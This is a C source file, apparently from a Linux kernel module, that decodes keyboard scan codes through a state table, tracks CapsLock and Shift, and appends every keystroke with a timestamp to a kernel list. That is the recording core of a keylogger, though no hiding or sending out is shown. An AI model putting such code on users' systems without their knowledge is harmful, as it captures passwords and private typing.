#include "keyboard.h"

static struct transition_table		scan_table [] = {
	{ 0x0, 0x10, 0x10, SUCCESS, 'q', PRESSED, "Q" },
	{ 0x0, 0x11, 0x11, SUCCESS, 'w', PRESSED, "W" },
	{ 0x0, 0x12, 0x12, SUCCESS, 'e', PRESSED, "E"},
	{ 0x0, 0x13, 0x13, SUCCESS, 'r', PRESSED, "R"},
	{ 0x0, 0x14, 0x14, SUCCESS, 't', PRESSED, "T"},
	{ 0x0, 0x15, 0x15, SUCCESS, 'y', PRESSED, "Y"},
	{ 0x0, 0x16, 0x16, SUCCESS, 'u', PRESSED, "U"},
	{ 0x0, 0x17, 0x17, SUCCESS, 'i', PRESSED, "I"},
	{ 0x0, 0x18, 0x18, SUCCESS, 'o', PRESSED, "O"},
	{ 0x0, 0x19, 0x19, SUCCESS, 'p', PRESSED, "P"},
	{ 0x0, 0x1C, 0x1C, SUCCESS, ENTER, PRESSED, "Enter" },
	{ 0x0, 0x90, 0x90, SUCCESS, 'q', RELEASED, "Q" },
	{ 0x0, 0x91, 0x91, SUCCESS, 'w', RELEASED, "W" },
	{ 0x0, 0x92, 0x92, SUCCESS, 'e', RELEASED, "E"},
	{ 0x0, 0x93, 0x93, SUCCESS, 'r', RELEASED, "R"},
	{ 0x0, 0x94, 0x94, SUCCESS, 't', RELEASED, "T"},
	{ 0x0, 0x95, 0x95, SUCCESS, 'y', RELEASED, "Y"},
	{ 0x0, 0x96, 0x96, SUCCESS, 'u', RELEASED, "U"},
	{ 0x0, 0x97, 0x97, SUCCESS, 'i', RELEASED, "I"},
	{ 0x0, 0x98, 0x98, SUCCESS, 'o', RELEASED, "O"},
	{ 0x0, 0x99, 0x99, SUCCESS, 'p', RELEASED, "P"},
	{ 0x0, 0x9C, 0x9C, SUCCESS, ENTER, RELEASED, "Enter" },
	{ 0x0, 0x3A, 0x3A, SUCCESS, CAPSLOCK, PRESSED, "CapsLock" },
	{ 0x0, 0xBA, 0xBA, SUCCESS, CAPSLOCK, RELEASED, "CapsLock" },
	{ 0x0, 0x2A, 0x2A, SUCCESS, LEFT_SHIFT, PRESSED, "left shift" },
	{ 0x0, 0xAA, 0xAA, SUCCESS, LEFT_SHIFT, RELEASED, "left shift" },
	{ 0x0, 0x36, 0x36, SUCCESS, RIGHT_SHIFT, PRESSED, "right shift" },
	{ 0x0, 0xB6, 0xB6, SUCCESS, RIGHT_SHIFT, RELEASED, "right shift" },
	{ 0x0, 0x0, 0x0, ERROR },
};

void	scan_fsm_update(struct fsm *scan_fsm, unsigned int new)
{
	unsigned int	i = -1;	

	while (scan_table[++i].state != ERROR) {
		if (scan_table[i].ct == scan_fsm->ct && scan_table[i].input == new) {
			scan_fsm->ct = scan_table[i].output;
			scan_fsm->state = scan_table[i].state;
			scan_fsm->key = scan_table[i].key;
			scan_fsm->position = scan_table[i].position;
			scan_fsm->name = scan_table[i].name;
			break;
		}
	}
	if (scan_table[i].state == ERROR)
		scan_fsm->state = ERROR;
}

void	scan_fsm_clear(struct fsm *scan_fsm)
{
	scan_fsm->ct = 0;
	scan_fsm->state = UNDEFINED;
	scan_fsm->key = 0;
	scan_fsm->position = -1;
	scan_fsm->name = NULL;
}

/* array of flags shift, ctrl, caps */

static char 		flags_array [] = { 0x0, 0x0 };

static void		SET_FLAGS(struct fsm *scan_fsm)
{
	if (scan_fsm->key == CAPSLOCK && scan_fsm->position == PRESSED && CAPSLOCK_SET) {
		/* printk(KERN_INFO "flush CAPSLOCK\n"); */
		flags_array[0] = 0;
	}
	else if (scan_fsm->key == CAPSLOCK && scan_fsm->position == PRESSED) {
		/* printk(KERN_INFO "set CAPSLOCK\n"); */
		flags_array[0] = 1;
	}

	if ((scan_fsm->key == LEFT_SHIFT || scan_fsm->key == RIGHT_SHIFT) 
		&& scan_fsm->position == PRESSED) {
		printk(KERN_INFO "set SHIFTLOCK\n");
		flags_array[1] = 1;
	}
	else if ((scan_fsm->key == LEFT_SHIFT || scan_fsm->key == RIGHT_SHIFT)
		&& scan_fsm->position == RELEASED) {
		printk(KERN_INFO "flush SHIFTLOCK\n");
		flags_array[1] = 0;
	}
}

static unsigned int	shift_table [] = {
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 60, 95, 62, 63,
       	40, 33, 64, 35, 36, 37, 94, 38,
	42, 33, 0, 58, 0, 43, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 123, 124, 125, 0, 0,
	126, 65, 66, 67, 68, 69, 70, 71,
	72, 73, 74, 75, 76, 77, 78, 79,
	80, 81, 82, 83, 84, 85, 86, 87,
	88, 89, 90,
};

static unsigned int	WHICH_ASCII(unsigned char key)
{
	unsigned int	value = (unsigned int)key;

	if (CAPSLOCK_SET)
		value -= 32;
	if (SHIFTLOCK_SET)
		value = SHIFT(key);
	
	return value;
}
 
void			scan_fsm_send(struct fsm *scan_fsm, void *target)
{
	struct timeval		tv;
	struct rtc_time		tm;
	struct keystroke	*ks;
	unsigned long		local_time;

	if ((ks = kmalloc(sizeof(struct keystroke), GFP_KERNEL))) {
		ks->key = scan_fsm->key;
		ks->state = scan_fsm->position;
		strcpy(ks->name, scan_fsm->name);

		SET_FLAGS(scan_fsm);
		ks->ascii = WHICH_ASCII(ks->key);

		do_gettimeofday(&tv);
		local_time = (u32)(tv.tv_sec - (sys_tz.tz_minuteswest * 60));
		rtc_time_to_tm(local_time, &tm);
		ks->tm = tm;

		INIT_LIST_HEAD(&ks->list);
		list_add_tail(&ks->list, target);
	}
}

/*		printk(KERN_INFO "[%04d-%02d-%02d %02d:%02d:%02d] key %c state %s name %s\n", tm.tm_year + 1900, tm.tm_mon + 1,
			tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ks->key, (ks->state == 0) ? "PRESSED" :
			"RELEASED", ks->name); */
